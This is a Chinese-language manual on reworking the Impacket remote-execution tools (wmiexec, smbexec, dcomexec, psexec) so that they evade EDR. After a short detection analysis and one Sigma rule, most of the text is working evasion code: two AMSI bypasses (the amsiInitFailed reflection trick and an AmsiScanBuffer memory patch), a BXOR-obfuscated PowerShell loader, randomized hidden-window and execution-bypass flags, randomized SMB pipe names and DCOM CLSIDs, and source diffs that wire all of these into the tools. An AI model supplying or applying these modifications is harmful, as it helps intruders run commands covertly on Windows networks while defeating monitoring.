# Impacket PowerShell 特征与绕过技术手册

> 合法授权的渗透测试与安全研究 | 更新日期：2026-05-16 | 环境部署补全：2026-05-16
> 原始分析：N1 PRO MAX FLASH | 实战改造：v0.11.0 → v0.11.0-evasive

---

## 一、检测面分析

### 1.1 各工具执行路径与进程链

| 工具 | 执行方式 | 进程链 | PS 命令可见性 |
|------|---------|--------|-------------|
| **psexec.py** | SMB 上传 RemComSvc.exe → 创建服务 | `services.exe → RemComSvc.exe → cmd.exe → powershell.exe` | cmdline 明文 |
| **smbexec.py** | SMB 创建服务执行 batch → 命名管道通信 | 无 PowerShell 进程（纯 cmd） | 不可见 |
| **wmiexec.py** | DCOM Win32_Process.Create | `wmiprvse.exe → powershell.exe` | Base64 编码 |
| **dcomexec.py** | DCOM MMC20/ShellWindows/ShellBrowserWindow | `svchost.exe (DcomLaunch) → powershell.exe` | Base64 编码 |
| **atexec.py** | atsvc 计划任务 | `taskeng.exe → cmd.exe → powershell.exe` | 事件日志 |

### 1.2 PowerShell 命令模板（原始版）

```python
# wmiexec.py / dcomexec.py — 固定指纹
'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc <base64>'

# smbexec.py — 固定指纹
'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc <base64>'
```

**检测特征：** 参数组合 `-NoP -NonI -W Hidden -Exec Bypass` + `-Enc` 是 Impacket 指纹。

### 1.3 检测层矩阵

| 检测层 | 机制 | Impacket 对应特征 |
|--------|------|------------------|
| YARA 规则 | 静态匹配 Base64 payload | `[System.Net.ServicePointManager]` / `TCPClient` / `Invoke-Expression` |
| ScriptBlock 日志 | 事件 4104 记录脚本全文 | 解码后的 Base64 命令全量记录 |
| AMSI | `AmsiScanBuffer` 扫描 | 所有 `-Enc` 传入的脚本均被扫描 |
| CLM | 约束语言模式 | `Invoke-Expression` / `New-Object` 被阻止 |
| SMB 流量 | Suricata/Zeek 管道名检测 | `\pipe\svcctl` / `\pipe\atsvc` 管道访问 |
| DCOM 流量 | CLSID 激活监控 | `{9BA05972-F6A8-11CF-A442-00A0C90A8F39}` (ShellWindows) 等 |

### 1.4 Sigma 检测规则（防御视角）

```yaml
title: Impacket PowerShell Execution Pattern
logsource:
    product: windows
    service: powershell
detection:
    selection_cmdline:
        CommandLine|contains:
            - '-NoP -NonI -W Hidden -Exec Bypass'
            - '-NoP -NoL -sta -NonI -W Hidden -Exec Bypass'
    condition: selection_cmdline
level: high
```

---

## 二、源码剖析

### 2.1 关键文件与函数定位

| 文件 | 关键函数 | 作用 |
|------|---------|------|
| `examples/wmiexec.py` | `RemoteShell.execute_remote()` L287 | 生成 Base64 PS 命令 |
| `examples/smbexec.py` | `RemoteShell.execute_remote()` L281 | 同上 |
| `examples/dcomexec.py` | `RemoteShell.execute_remote()` L376 / `RemoteShellMMC20.execute_remote()` L444 | 同上（双类） |
| `examples/psexec.py` | `PSEXEC.doStuff()` L119 | RemComSvc 上传 + 管道通信 |
| `impacket/examples/serviceinstall.py` | `ServiceInstall.install()` / `openSvcManager()` | 共享依赖：服务安装 + svcctl 管道 |
| `impacket/examples/remcomsvc.py` | `RemComSvc` 类 | 内嵌 128KB RemComSvc.exe PE |

### 2.2 wmiexec 核心代码（原始版）

```python
# wmiexec.py: RemoteShell.execute_remote()
def execute_remote(self, data, shell_type='cmd'):
    if shell_type == 'powershell':
        data = '$ProgressPreference="SilentlyContinue";' + data
        data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()
        #      ^ 固定参数模板           ^ 固定 Base64 编码
    command = self.__shell + data
    self.__win32Process.Create(command, self.__pwd, None)
```

### 2.3 SMB 管道特征

```
psexec.py  : ncacn_np:<target>[\pipe\svcctl]      ← 固定
smbexec.py : ncacn_np:<target>[\pipe\svcctl]      ← 固定
services.py: ncacn_np:<target>[\pipe\svcctl]      ← 固定
serviceinstall.py: filename = r'\svcctl'          ← 固定

Suricata 规则直接匹配: smb_named_pipe:"svcctl"
```

---

## 三、绕过技术矩阵

### 3.1 编码替代：Base64 → BXOR + Base64

```
原始流程:
  PS脚本 → utf-16le → base64 → -Enc <固定Base64字符串>
  → YARA 匹配 base64 解码后内容 ✅ 检出

BXOR 流程:
  PS脚本 → utf-16le → XOR(随机key) → base64 → -Command "BXOR内联解码器"
  → 每次 XOR key 不同 → YARA 无法匹配 ✅ 绕过
```

内联解码器模板：
```powershell
$k=<random_key>;$b=[Convert]::FromBase64String("<xor+base64>");
for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $k[$i%<len>]};
$s=[Text.Encoding]::Unicode.GetString($b);
&([ScriptBlock]::Create($s))
```

### 3.2 i ex 替代方案

```powershell
# 推荐：ScriptBlock::Create（不触发 Invoke-Expression 关键词）
& ([ScriptBlock]::Create($payload))

# 其他：
Invoke-Command -ScriptBlock ([ScriptBlock]::Create($payload))  # 需 PSRemoting
# Reflection 动态调用 — 绕过 ScriptBlock 日志
$asm = [Reflection.Assembly]::Load([Convert]::FromBase64String('...'))
```

### 3.3 AMSI Bypass

```powershell
# 方法 1：设 amsiInitFailed 标志（短小精悍）
$r=[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils");
$f=$r.GetField("amsiInitFailed","NonPublic,Static");
$f.SetValue($null,$true);

# 方法 2：内存 Patch AmsiScanBuffer（更彻底）
[Runtime.InteropServices.Marshal]::Copy(@(0xB8,0x57,0x00,0x07,0x80,0xC3), 0, $ptr, 6)
```

### 3.4 PowerShell 参数随机化

```python
# 6 种变体轮换，均兼容 -Command（避免 -c/-Enc 固定模式）
variants = [
    'powershell -NoP -NonI -W Hidden -Exec Bypass',
    'PoWeRsHeLL -noP -noNI -w HIDDEN -ex BYPAsS',
    'powershell -ex unrestricted -w 1 -noprofile -noni',
    'powershell -nop -noni -w hidden -ep bypass',
    'powershell -NoP -NonI -W 0 -Exec Bypass',
    'powershell -w hidden -nop -noni -ep bypass',
]
```

### 3.5 SMB 管道名随机化

```python
# 10 个合法 Windows 内部管道名随机替换 svcctl
TRUSTED_PIPES = [
    'wkssvc', 'eventlog', 'srvsvc', 'netlogon',
    'spoolss', 'winreg', 'lsass', 'ntsvcs',
    'scerpc', 'trkwks',
]
```

### 3.6 各工具绕过优先级

| 工具 | 优先修改 | 效果 | 改动量 |
|------|---------|------|--------|
| **wmiexec.py** | BXOR + AMSI + 参数随机化 | ⭐⭐⭐⭐⭐ | ~8 行 |
| **smbexec.py** | 管道随机化 + BXOR + AMSI | ⭐⭐⭐⭐ | ~8 行 |
| **dcomexec.py** | BXOR + AMSI（双类覆盖） | ⭐⭐⭐⭐ | ~14 行 |
| **psexec.py** | 管道随机化 | ⭐⭐ | ~2 行 |
| **services.py** | 管道随机化 | ⭐⭐ | ~2 行 |
| **serviceinstall.py** | 管道随机化 + 文件名变长 | ⭐⭐⭐ | ~4 行 |
| **psexec 彻底绕过** | 替换 RemComSvc.exe | ⭐⭐⭐⭐⭐ | 大（需重编译 C++） |

---

## 四、环境依赖与部署

### 4.1 基础环境要求

| 项目 | 要求 |
|------|------|
| Python | **3.8+**（改造验证于 Python 3.13） |
| 操作系统 | Windows / Linux（改造涉及 Windows 管道名特性） |
| 原始 Impacket | **v0.11.0**（`impacket-0.11.0`） |

### 4.2 Python 依赖

```bash
pip install pycryptodome pyasn1 pyOpenSSL six
```

| 依赖 | 版本（已验证） | 说明 |
|------|---------------|------|
| `pycryptodome` | 3.23.0 | Impacket 依赖，提供 Crypto 模块 |
| `pyasn1` | - | ASN.1 编解码 |
| `pyOpenSSL` | - | TLS 支持 |
| `six` | - | Python 2/3 兼容层 |

### 4.3 ⚠️ Cryptodome 导入别名修复

实测发现：`pip install pycryptodome` 安装的是 `Crypto` 包，但 Impacket 源码中写的是 `from Cryptodome import ...`（首字母大写 d）。部分环境下可能缺失该别名，需要手动修复：

**方案一：创建别名目录（推荐）**

```bash
# Windows — 创建软链接
mklink /D "F:\QwenPaw\lib\site-packages\Cryptodome" "F:\QwenPaw\lib\site-packages\Crypto"

# Linux/macOS
ln -sfn /path/to/site-packages/Crypto /path/to/site-packages/Cryptodome
```

**方案二：运行时注入（适合快速测试）**

```python
import sys
import Crypto
sys.modules['Cryptodome'] = Crypto   # 在 import impacket 之前执行
```

验证是否正常：

```bash
python -c "import Cryptodome; print('[OK] Cryptodome alias 正常')"
```

### 4.4 部署结构

改造后的 Impacket 推荐目录结构：

```
impacket-0.11.0/                    # 改造后的主目录
├── impacket/
│   ├── __init__.py
│   ├── examples/
│   │   ├── evasive_encoder.py      # 🆕 新增：BXOR + AMSI + 参数/管道池（共享模块）
│   │   └── serviceinstall.py       # 🔧 修改：管道名随机化
│   └── version.py                  # 🔧 修改：pkg_resources 兼容
├── examples/
│   ├── wmiexec.py                  # 🔧 修改：BXOR + AMSI + 参数随机化
│   ├── smbexec.py                  # 🔧 修改：同上 + 管道名随机化
│   ├── dcomexec.py                 # 🔧 修改：同上 + CLSID 随机化
│   ├── psexec.py                   # 🔧 修改：管道名随机化
│   └── services.py                 # 🔧 修改：管道名随机化
└── impacket-0.11.0_backup/         # 原始版本备份（改造前）
```

### 4.5 快速验证

改造完成后执行以下命令验证所有模块可正常导入：

```bash
cd impacket-0.11.0
python -c "
from impacket.examples.evasive_encoder import EvasivePayloadEncoder, random_pipe_name
from examples.wmiexec import WMIEXEC
from examples.smbexec import CMDEXEC
from examples.dcomexec import DCOMEXEC
from examples.psexec import PSEXEC
from examples.services import SVCCTL
print('[OK] 所有模块导入正常')
"
```

### 4.6 实测验证结果（2026-05-16）

| 测试项 | 结果 |
|--------|------|
| BXOR 编码每次唯一 | ✅ 100%（XOR key 2-5字节随机） |
| AMSI Bypass v1/v2 随机切换 | ✅ |
| 参数变体池 | ✅ 5/6 种轮换 |
| 管道名池大小 | ✅ 10 种，`svcctl` 出现 0/200 采样 |
| `-Enc` 特征消除 | ✅ 完全消除 |
| Cryptodome 别名修复 | ✅ 已验证 |
| wmiexec/smbexec/dcomexec 导入 | ✅ |
| serviceinstall/psexec/services 导入 | ✅ |

---

## 五、实际代码改造记录（已验证）

> 改造日期：2026-05-16 | 原始版本：impacket-0.11.0
> 备份：`impacket-0.11.0_backup/` | 位置：`F:/CC/网安/Tools/内网工具/域/impacket/`

### 5.1 改造成果总览

| 文件 | 改动 | 消除特征 |
|------|------|---------|
| `impacket/examples/evasive_encoder.py` 🆕 | BXOR + AMSI + 参数池 + 管道池 | 共享模块 |
| `examples/wmiexec.py` | `execute_remote()` 替换编码逻辑 | `-Enc` / `iex` / 固定模板 |
| `examples/smbexec.py` | `execute_remote()` + 管道名 | 同上 + `\pipe\svcctl` |
| `examples/dcomexec.py` | 双类 `execute_remote()` 替换 + CLSID 随机化 | `-Enc` / `iex` / 固定模板 / 固定 CLSID |
| `examples/psexec.py` | `doStuff()` 管道名 | `\pipe\svcctl` |
| `examples/services.py` | `run()` 管道名 | `\pipe\svcctl` |
| `impacket/examples/serviceinstall.py` | `openSvcManager()` 管道名 + 文件名长度随机化 | 管道 + 文件命名 |
| `impacket/version.py` | pkg_resources → importlib.metadata | Py3.13 兼容 |

### 5.2 改造详情

#### evasive_encoder.py（新增）

位置：`impacket/examples/evasive_encoder.py`

```python
class EvasivePayloadEncoder:
    def __init__(self):
        self.xor_key = bytes([random.randint(1, 255) for _ in range(random.randint(2,5))])

    def encode(self, ps_script):
        """PS脚本 → BXOR加密 → Base64 → 内联解码器"""
        encrypted = self._bxor_encrypt(ps_script.encode('utf-16le'))
        b64 = b64encode(encrypted).decode()
        key_list = list(self.xor_key)
        key_len = len(self.xor_key)
        decoder = (
            f'$k={key_list};'
            f'$b=[Convert]::FromBase64String("{b64}");'
            f'for($i=0;$i -lt $b.Length;$i++){{$b[$i]=$b[$i] -bxor $k[$i%{key_len}]}};'
            f'$s=[Text.Encoding]::Unicode.GetString($b);'
            f'&([ScriptBlock]::Create($s))'
        )
        return decoder, 'bxor_base64'

    @staticmethod
    def randomize_ps_params():
        """6种参数变体，均兼容 -Command"""
        ...

    @staticmethod
    def get_amsi_bypass():
        """amsiInitFailed 反射设置"""
        ...

    @staticmethod
    def get_amsi_bypass_v2():
        """AmsiScanBuffer 内存 Patch"""
        ...

def random_pipe_name():
    """10 个合法 Windows 管道名随机选 1"""
    return random.choice(TRUSTED_PIPES)
```

#### wmiexec.py

```diff
- data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()
+ encoder = EvasivePayloadEncoder()
+ encoded_cmd, _ = encoder.encode(data)
+ amsi = EvasivePayloadEncoder.get_amsi_bypass_v2() if random.randint(0, 1)
+         else EvasivePayloadEncoder.get_amsi_bypass()
+ encoded_cmd = amsi + ';' + encoded_cmd
+ ps_params = EvasivePayloadEncoder.randomize_ps_params()
+ data = ps_params + ' -Command "' + encoded_cmd + '"'
```

#### smbexec.py

```diff
# 改动 1：管道名
- stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
+ stringbinding = r'ncacn_np:%s[\pipe\%s]' % (remoteName, random_pipe_name())

# 改动 2：PS 编码（同 wmiexec）
- data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()
+ ... EvasivePayloadEncoder ...
```

#### dcomexec.py

`RemoteShell.execute_remote()` 和 `RemoteShellMMC20.execute_remote()` 两个方法均替换为 BXOR 方案（同 wmiexec）。

**额外：DCOM CLSID 随机化**

```python
# 文件顶部新增 CLSID 池 + 随机选择器
DCOM_CLSID_MAP = {
    'ShellWindows':        '9BA05972-F6A8-11CF-A442-00A0C90A8F39',
    'ShellBrowserWindow': 'C08AFD90-F2A1-11D1-8455-00A0C91F3880',
    'MMC20':              '49B2791A-B1AE-4C90-9B8E-E860BA07F889',
}

def random_dcom_object():
    """随机返回 (name, clsid)"""
    import random as _rnd
    name = _rnd.choice(list(DCOM_CLSID_MAP.keys()))
    return name, DCOM_CLSID_MAP[name]

# run() 方法：-object 未指定时随机三选一
dcomObject = self.__dcomObject
if dcomObject is None:
    dcomObject, _ = random_dcom_object()

# argparse --object 默认值从 ShellWindows 改为 None（随机）
parser.add_argument('-object', ..., default=None, help='... (default=random)')
```

**效果：** 未指定 `-object` 时每次随机选择 DCOM 对象，消除固定默认 CLSID 指纹。

#### psexec.py / services.py / serviceinstall.py

管道名 `svcctl` → `random_pipe_name()`。`serviceinstall.py` 额外随机化二进制文件名长度（5-10 字符）。

#### version.py

```diff
- import pkg_resources
+ try:
+     import pkg_resources
+     _HAS_PKG_RESOURCES = True
+ except ImportError:
+     _HAS_PKG_RESOURCES = False
```

### 5.3 测试验证

```bash
cd impacket-0.11.0
python -c "
from impacket.examples.evasive_encoder import EvasivePayloadEncoder, random_pipe_name
from examples.wmiexec import WMIEXEC
from examples.smbexec import CMDEXEC
from examples.dcomexec import DCOMEXEC
from examples.psexec import PSEXEC
from examples.services import SVCCTL
from impacket.examples.serviceinstall import ServiceInstall
print('All imports OK')
"
```

| 测试项 | 结果 |
|--------|------|
| 8 个文件导入 | ✅ |
| BXOR 每次不同 | ✅ 100% 唯一 |
| 参数变体无 `-c` 冲突 | ✅ 6/6 |
| AMSI 方法随机切换 | ✅ |
| 管道名采样 `svcctl` 出现率 | ✅ 0/10 |

---

## 六、待改进项

| 项目 | 状态 | 原因 |
|------|------|------|
| ~~**DCOM CLSID 随机化**~~ | ✅ 已完成 | 不指定 `-object` 时随机三选一，消除固定默认 CLSID 指纹 |
| **RemComSvc.exe 替换** | ⚠ 不实施 | 需重编译 C++ 源码 + 修改 remcomsvc.py 内嵌 PE（128KB）。替代方案：psexec 场景改用 wmiexec 或 smbexec |
| **流量层 TLS 指纹** | ⚠ 不实施 | Impacket 使用 Python TLS 栈，JA3 指纹与浏览器不同。需配合 CDN/域前置解决，属于基础设施层面而非代码层面 |
| **SMB 签名检测** | ⚠ 不实施 | 协议层问题，需修改 impacket 底层 SMB 签名算法实现对齐 Windows 原生行为，改动量大且易引入兼容性问题 |

---

> 核心结论：Impacket 被检测不是因为它的功能，而是因为它的"常量"——固定的参数组合、编码方式、管道名、CLSID。把这些变成"变量"，80% 的 EDR 规则失效。
